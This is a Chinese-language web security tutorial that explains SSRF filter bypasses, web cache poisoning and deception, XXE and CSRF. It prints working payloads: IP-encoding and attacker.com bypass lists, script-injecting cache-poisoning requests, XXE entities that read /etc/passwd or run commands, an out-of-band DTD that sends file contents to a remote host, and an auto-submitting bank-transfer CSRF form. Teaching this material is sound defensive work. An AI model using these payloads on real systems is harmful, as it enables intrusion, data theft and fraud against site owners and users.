https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/
```



## 白名单&&黑名单

在前面中我们提到SSRF产生的原因为未对参数中引用的URL进行限制，使得攻击者能够利用这一漏洞将引用的URL指向内网中的其它地址以获得本应该被拒绝外网访问的资源。因此常见的SSRF防御手段为对引用的URL进行限制。常见的限制手段有**黑名单和白名单**两种。

### 什么是黑名单&&白名单?

黑名单是指不允许某些地址并在收到黑名单地址作为输入时阻止请求的做法。白名单意味着服务器只允许通过包含预先指定列表中的 URL 的请求，并使所有其他请求失败。

### 绕过黑名单

由于web应用的需求是需要获取外部资源，大多数SSRF保护机制都是以黑名单的形式出现的。如果面临黑名单，有多种方法欺骗服务器。

#### 重定向

让服务器请求一个你控制的 URL，该 URL 重定向到列入黑名单的地址。例如，你可以在您的 Web 服务器上托管一个包含以下内容的文件：

```
<?php header("Location: http://127.0.0.1"); ?>
```

假设此文件托管在[http://attacker.com/redirect.php](http://attacker.com/redirect.php) 。这样，当您向目标服务器发出请求[http://attacker.com/redirect.php](http://attacker.com/redirect.php)时，目标服务器实际上被重定向到[http://127.0.0.1](http://127.0.0.1) ，一个受限制的内部地址。
![](https://img-blog.csdnimg.cn/img_convert/d71bd20599da72f1b6f5b69de2255210.png)



#### 更改IP写法

下面是一些常用于绕过黑名单的方式

```
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR绕过
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# 点号绕过
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# 十进制绕过
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# 八进制绕过
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# 十六进制绕过
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# 还可以混合使用各种编码绕过
# https://www.silisoftware.com/tools/ipconverter.php

# 畸形而罕见的绕过方式
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS解析到本地主机
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

![](https://img-blog.csdnimg.cn/img_convert/b8035df8daa299bef39eca3ee1483083.png)



### 绕过白名单

白名单通常更难绕过，因为它们在默认情况下比黑名单更严格。但如果白名单域中存在开放重定向漏洞，则有可能。如果您可以找到一个开放的重定向，你可以请求一个重定向到内部 URL 的白名单 URL。
例如,可以通过使用子域或目录作为白名单域名。

```
victim.com.attacker.com
attacker.com/victim.com
```



#### 更改域名写法

```
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ   利用封闭的字母数字绕过
```

下面封闭的字母数字

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```



#### 域混淆

利用不同的域名配合符号进行干扰从而突破限制

```
# 还尝试将 attacker.com 更改为 127.0.0.1 以尝试访问
http://{domain}@attacker.com
http://{domain}%6D@attacker.com
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
http://attacker.com#{domain}
http://{domain}.attacker.com
http://attacker.com/{domain}
http://attacker.com/?d={domain}
https://{domain}@attacker.com
https://attacker.com#{domain}
https://{domain}.attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
http://{domain}@attacker.com
http://attacker.com#{domain}
http://{domain}.attacker.com
http://attacker.com/{domain}
http://attacker.com/?d={domain}
http://attacker.com%00{domain}
http://attacker.com?{domain}
http://attacker.com///{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/

# 在每个 IP 位置尝试将 1 个攻击者域和其他受害者域
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# 参数污染
next={domain}&next=attacker.com
```



## 总结

SSRF作为跳板攻击，常涉及到内网资产的安全性，其中攻击面最大的协议是Gopher，利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache还可以攻击内网未授权MySQL
常见的SSRF防御机制有两种原理，分别是黑名单和白名单。基于黑名单的SSRF保护相对容意绕过，基于白名单的SSRF保护则较难绕过，有一定的运气成分。如果能利用其他漏洞（如重定向漏洞)与SSRF相结合，可以达到事半功倍的作用。

# web缓存中毒和web缓存欺骗



## 什么是web缓存

如果服务器必须分别向每个HTTP 请求发送新的响应，这可能会使服务器过载，从而导致延迟问题和各种问题，尤其是在繁忙时段。而缓存主要是减少此类问题的一种方法

缓存位于服务器和用户之间，它保存（缓存）对特定请求的响应，通常保存一段固定的时间。如果另一个用户随后发送等效请求，则缓存会直接向用户提供缓存响应的副本，而无需与后端进行任何交互。通过减少必须处理的重复请求的数量，这极大地减轻了服务器上的负载

用户发送请求的时间段(time user)，缓存(cache)，网站(website)

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/02784e2bb2dd482e8b440387d1aea772.png)


## 缓存键(cache key)

当缓存收到HTTP请求时，它首先要判断是否有缓存的响应可以直接服务，或者是否需要转发请求由后端服务器处理
简单来说，就是通过缓存键来判断两个请求是否正在尝试加载相同的资源
下面这两个请求是等效的，并使用从第一个请求缓存的响应来响应第二个请求：

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```

因此，该页面将提供给第二位访问者错误的语言格式

## 什么是缓存中毒

攻击者可以利用Web服务器和缓存的服务，以便向其他用户提供有害的 HTTP 响应

它的攻击方式是通过X-Forwarded-Host头，发送导致有害响应的请求，该响应将保存在缓存中并提供给其他用户，其他用户访问到此页面时将不是正常页面，而是被攻击者“中毒”之后的的页面，产生的危害通常是XSS，也可能导致信息泄露

Web缓存中毒可以利用许多不同的攻击，比如XSS、JavaScript 注入、开放重定向等漏洞

## 什么是缓存欺骗

它的漏洞原理和RPO （Relative Path Overwrite）相对路径覆盖漏洞较为类似，根因都在于浏览器和网络服务器对相同URL请求的解析不一致（宽字节、00截断也是）

通过“欺骗”用户访问一个不存在的静态页面，从而使敏感页面保存在缓存中，从而窃取用户敏感信息，通常是用户个人信息、业务敏感数据等，如果响应的主体中包含了用户的会话标识符、CSRF令牌可进一步可导致ATO

## 缓存中毒和缓存欺骗的区别

在Web 缓存中毒中，攻击者利用服务器在缓存中存储一些恶意内容，然后把这些内容从缓存中发送给其他用户

在web缓存欺骗中，攻击者利用服务器将属于另一个用户的一些敏感内容存储在缓存中，然后攻击者从缓存中查看这些敏感内容

## web缓存中毒

在进行web缓存中毒攻击前，需要认识一些常见的HTTP标头

### HTTP标头



#### 请求包的ip来源

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Via: 1.0 fred, 1.1 127.0.0.1
Connection: close, X-Forwarded-For
```



#### 重写位置

```
X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console
```



#### 服务器的缓存标头

```
X-Cache：在响应中可能具有请求未缓存时的值和缓存时的值

Cache-Control：指示资源是否正在被缓存以及下一次资源将在何时被再次缓存
Cache-Control: public, max-age=1800

Vary：通常在响应中用于指示附加标头，这些标头被视为缓存键的一部分，即使它们通常是未加密的

Age：定义对象在代理缓存中的时间（以秒为单位）

Server-Timing: 也表明资源被缓存
Server-Timing: cdn-cache; desc=HIT
```



#### 本地的缓存标头

```
Clear-Site-Data: 标头指示应删除的缓存
Clear-Site-Data: "cache", "cookies"

Expires：包含响应到期的日期/时间
Expires：Wed, 21 Oct 2015 07:28:00 GMT

Warning：一般 HTTP 标头包含有关消息状态可能出现的问题的信息。一个响应中可能会出现多个标头
WarningWarningWarning: 110 anderson/1.3.37 "Response is stale"
```



#### 服务器信息

```
Server: Apache/2.4.1 (Unix)
X-Powered-By: PHP/5.3.3
```

我只介绍了一部分，在这里有http标头大全：

```
https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/web/http-request-headers
```



### web缓存中毒攻击



#### 1.X-forwarded-Host

如果网站以不安全的方式处理非缓存键的输入并允许后续的HTTP响应被缓存，则他们很容易遭受Web缓存中毒。
比如：

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

x-forwarded-host头的值用于动态生成image的URL，以上的案例可以这样利用：

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

如果缓存了此响应，则将向/en?region=uk访问的所有用户都会收到XSS影响。

#### 2.cookie

Cookie有时也用于在响应中动态生成内容，如果cookie也存在非缓存键则也会收到影响。
示例：

```
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

需要注意的是，如果cookie被用户大量使用，则定期请求将清理缓存

#### 3.X-Forwarded-scheme/X-forwarded-Proto

X-Forwarded-scheme/X-Forwarded-Proto头：

当值不为https时，表示当前请求以http的方式发送，一般情况下都会返回302跳转到当前URL的https协议请求。当非缓存键是X-Forwarded-scheme头时，如果网站同时支持X-Forwarded-Host则可以通过两者结合达到web投毒的攻击效果

```
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```

发送x-forwarded-scheme: http标头将导致 301 重定向到同一位置，这可以造成dos攻击
![](https://img-blog.csdnimg.cn/img_convert/07668aa0dad246f25ffd8fb3574cbeb5.png)
该应用程序还可能支持标头X-forwarded-host并将用户重定向到该主机，从而可以从攻击者服务器加载 javascript 文件：
![](https://img-blog.csdnimg.cn/img_convert/ab5c16b77d14fa42499af49cf300af70.png)

#### 4.返回缓存信息头

暴露太多的响应信息也可能会让攻击更容易

```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

我们有一个X-Host协议头可以用于导入脚本的URL。响应协议头“Age”和“max-age”分别是当前响应的时间和它将过期的时间。总之，这些参数告诉我们应该在那个时间发送的有效Payload，以确保我们的响应被第一个缓存

更多利用方法：

```
https://xz.aliyun.com/t/2585
```



### web缓存欺骗攻击

1.设置一个用户未缓存的服务器，并包含一个配置文件部分，如：[https://www.example.com/my_profile](https://www.example.com/my_profile)

2.攻击者引诱受害者打开恶意制作的链接https://www.example.com/my_profile/test.css，其中“test.css”文件在网络服务器上不存在。

3.由于它是一个不存在的文件，应用程序会忽略 URL 的“test.css”部分并加载受害者的个人资料页面。此外，缓存将资源识别为样式表，并将其缓存

4.然后攻击者向缓存页面发送 GET 请求，https://www.example.com/my_profile/test.css将返回受害者个人资料页面

只有满足以下所有条件时，Web 缓存欺骗攻击才会起作用：

```
当https://www.example.com/my_profile/test.css被请求时，https://www.example.com/my_profile返回的内容作为响应。

Web缓存功能配置为根据扩展名缓存文件。

受害者在访问恶意制作的URL时必须经过身份验证。
```

![](https://img-blog.csdnimg.cn/img_convert/0bbe1f5850dfc3cff9ff6e12d090de7d.png)
缓存欺骗利用工具

```
https://github.com/arbazkiraak/web-cache-deception-checker
```

web缓存欺骗由于案例过少，之后实战后慢慢更新总结

## 总结

在挖掘web 缓存漏洞的时候首先要确定web系统架设了CDN，负载均衡器或反向代理等缓存设备，其次观察返回头是否设置缓存控制头Cache Control：no-cache，max-age=0，private，no-store，若未设置则很大可能存在此漏洞。

当然即使存在缓存标头也要尝试下，即使缺少缓存头，也不代表一定会获得缓存信息攻击

# XXE

XXE(XML External Entity Injection) 全称为 XML 外部实体注入。XML 外部实体攻击是一种针对解析 XML 输入的应用程序的攻击。

## 什么是XML？

XML是可扩展标记语言（extensible markup language）的缩写，它是一种数据表示格式，可以描述非常复杂的数据结构，常用于传输和存储数据。
例如，一个描述书籍的XML文档可能如下：

```javascript
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE note SYSTEM "book.dtd">
<book id="1">
    <name>Java核心技术</name>
    <author>Cay S. Horstmann</author>
    <isbn lang="CN">1234567</isbn>
    <tags>
        <tag>Java</tag>
        <tag>Network</tag>
    </tags>
    <pubDate/>
</book>
```

![](https://img-blog.csdnimg.cn/img_convert/5d8f5f4fa77f81603af5738f42412ab1.png)

## 什么是 XML 实体？

XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。XML 语言规范中内置了各种实体。例如，实体<和>表示字符<和>。这些是用于表示 XML 标记的元字符，因此当它们出现在数据中时，通常必须使用它们的实体来表示。
<、>、&、’、”在xml中是特殊符号，需要用实体表示

```javascript
<	&lt;
>	&gt;
&	&amp;
’ 	&apos;
”	&quot;
```

![](https://img-blog.csdnimg.cn/img_convert/4567edc99a35b2e0e8519d30a83a371d.png)

## DTD是什么？

XML文件的文档类型定义（Document Type Definition）可以看成一个或者多个XML文件的模板，在这里可以定义XML文件中的元素、元素的属性、元素的排列方式、元素包含的内容等等。通常简称为DTD。
DTD文档有三种应用形式，分别是内部DTD，外部DTD，最后是两者的混合。
内部文档DTD：

```javascript
<!DOCTYPE 根元素[定义内容]> //根元素可以自定义名称，定义内容为DTD的声明语法
```

外部文档DTD：

```javascript
<!DOCTYPE 根元素 SYSTEM "DTD文件路径">
```

内外部DTD文档结合

```javascript
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
```



## 实体

声明DTD的实体语法，我们可以修改或者定义XML中的内容，来达到想要的目的，这也是XXE攻击的由来的原因，常见的手法有两种：自定义内部实体和自定义外部实体
DTD的实体声明语法如下：

```javascript
<!ENTITY 实体名称　实体內容> //实体名称和实体内容均可以自定义
```



### 自定义内部实体

可以修改xml文档中的内容

```javascript
<!DOCTYPE user[<!ENTITY myentity "aa">]>
```

```javascript
<user><username>&myentity;</username><password>hh</password></user>
//这里引用了一个实体名称myentity，需要在标签里用 &实体名称; 引用它
```

![](https://img-blog.csdnimg.cn/img_convert/e45c4db3a57601c8d0f6884dfd524733.png)

### 自定义外部实体

可以引用外部资源到实体中

```javascript
<!DOCTYPE user[<!ENTITY myentity SYSTEM "file:///etc/passwd">]>
//命名了一个叫myentity的实体，SYSTEM的作用是获取外部资源并将其存储在myentity实体中
```

```javascript
<user><username>&myentity;</username><password>hh</password></user>
//调用了myentity实体
```

可以看见成功的读取到了敏感文件
![](https://img-blog.csdnimg.cn/img_convert/adfd3e1b03d14c4261292f1cc01952aa.png)

## 攻击层面

由于自定义外部实体有着可以引用外部资源的功能,SYSTEM后面的url分为以下几种方式，利用协议攻击
![](https://img-blog.csdnimg.cn/img_convert/b98032c0d70d80c7f3ff9f38b7c49c19.png)
![](https://img-blog.csdnimg.cn/img_convert/1de517877446a01cee493d178769f9db.png)
基本可以达到和SSRF一样的效果，探测内网端口(http/https)，DDOS，读取任意文件(file)，命令执行(expect)等

### 读取文件

```javascript
<?xml version = "1.0"?>
<!DOCTYPE user [
<!ENTITY xxe SYSTEM "file:///e://test.txt">
]>
<x>&xxe;</x>
```



### 内网探测

```javascript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ENTITY xss SYSTEM "http://192.168.3.1:81/index.txt" >
  ]>
<x>&xss;</x>
```



### RCE

```javascript
该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令
<?xml version = "1.0"?>
<!DOCTYPE user [
<!ENTITY xxe SYSTEM "expect://id" >
]>
<x>&xxe;</x>
```

RCE漏洞在实战一般很难遇到

### 伪协议-读文件

```javascript
<!DOCTYPE user[<!ENTITY myentity SYSTEM "php://filter/convert.base64-encode/resource=xxx.php">]>
```

![](https://img-blog.csdnimg.cn/img_convert/3852e2766c8c2e9ca07d10c4817f91f4.png)

### 引入外部实体 dtd

```javascript
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://127.0.0.1/test.dtd">
%file;
]>
<x>&send;</x>
test.dtd:
<!ENTITY send SYSTEM "file:///d:/test.txt">
```

- 条件：看对方的应用有没有禁用外部实体引用，这也是防御XXE的一种措施

![](https://img-blog.csdnimg.cn/img_convert/afe65f09a238669cb0fdbe70166c9f3d.png)
![](https://img-blog.csdnimg.cn/img_convert/b2b135377841bd8555209d78a0cb0824.png)

#### 关于百分号的理解

XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：
![](https://img-blog.csdnimg.cn/img_convert/bab76cf64f7da7b7bc85bbc2d1327a2b.png)

### 无回显-OOB

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///d:/test.txt">
<!ENTITY % dtd SYSTEM "http://xx.xx.xx.xx/test.dtd">
%dtd;
%send;
]>
test.dtd:
<!ENTITY % payload
"<!ENTITY &#x25; send SYSTEM 'http://xx.xx.xx.xx/?data=%file;'>"
>
```

服务器请求数据读取文件，然后将文件内容发送到远程服务地址的脚本，最后服务器再访问一次远程地址并把数据放到data=后面中，通过日志查看数据

## 总结

自定义内部实体一般情况下没有实质性的危害，真正有用的是可以引用外部资源的自定义外部实体，总结的是比较基础的知识点，通常可以利用引用外部实体进行读取绕过，或者OOB读取无回显。
# CSRF
## 什么是CSRF？
CSRF（Cross-Site Request Forgery），也称为“跨站请求伪造”，是一种常见的Web应用程序安全漏洞，攻击者利用用户已经登录的状态下，诱骗用户访问恶意网站或点击恶意链接，向受害者的Web向已登录应用程序发送伪造的HTTP请求，从而实现对受害者的攻击。

攻击者通过各种手段，例如在电子邮件中插入链接、在社交媒体上发布恶意链接或图片等方式引导用户点击，将受害者引导到恶意网站或页面，实现对用户账户的控制。当用户在已经登录的情况下访问恶意网站时，恶意网站或页面可能会发送HTTP请求，如更改用户信息、发起转账请求等，从而伪造用户的身份，向Web应用程序发送伪造请求，执行各种恶意操作

## CSRF攻击举例
假设有一个银行网站，该网站在用户登录后允许用户通过如下URL进行资金转账：
```
http://bank.example.com/transfer?amt=1000&toAccount=baimao
```
在这个URL中，amt 参数表示要转账的金额，而 toAccount 参数则是接收资金的账号。

如果用户在访问攻击者的网站时，攻击者的网页中包含了一个自动提交到上述银行URL的表单或者是通过JavaScript发起的请求，那么用户的浏览器可能会无意中发送转账请求：
```
<img src="http://bank.example.com/transfer?amt=1000&toAccount=hacker" style="display: none;">
```
如果用户已经登录了银行网站，他们的浏览器可能会自动使用用户的认证cookie来执行这个请求，导致资金被转移到攻击者指定的账户

## 漏洞代码详解
一个简单的漏洞Web网站可能用如下的HTML表单来处理用户的请求：
```
<form action="http://bank.example.com/transfer" method="POST">
  <input type="text" name="amt"/>
  <input type="text" name="toAccount"/>
  <input type="submit" value="Transfer Funds"/>
</form>
```
如果该网站没有验证请求是否是用户有意发起的，那么攻击者就可以创建一个自己的恶意网页，包含以下代码：
```
<form action="http://bank.example.com/transfer" method="POST" id="maliciousForm">
  <input type="hidden" name="amt" value="1000"/>
  <input type="hidden" name="toAccount" value="attacker"/>
</form>
<script>document.getElementById('maliciousForm').submit();</script>
```
当受害者浏览该恶意网页时，表单会自动提交，而受害者可能完全不知情
# 总结
在对网站进行漏洞挖掘时，用burp去看各个功能点的请求包，比如
```
用户已登录的论坛允许通过GET请求更改用户的邮箱地址。
用户已登录的社交网络通过一个简单的POST请求允许添加新的好友或者发帖。
在线银行服务允许通过POST请求进行资金转账。
```

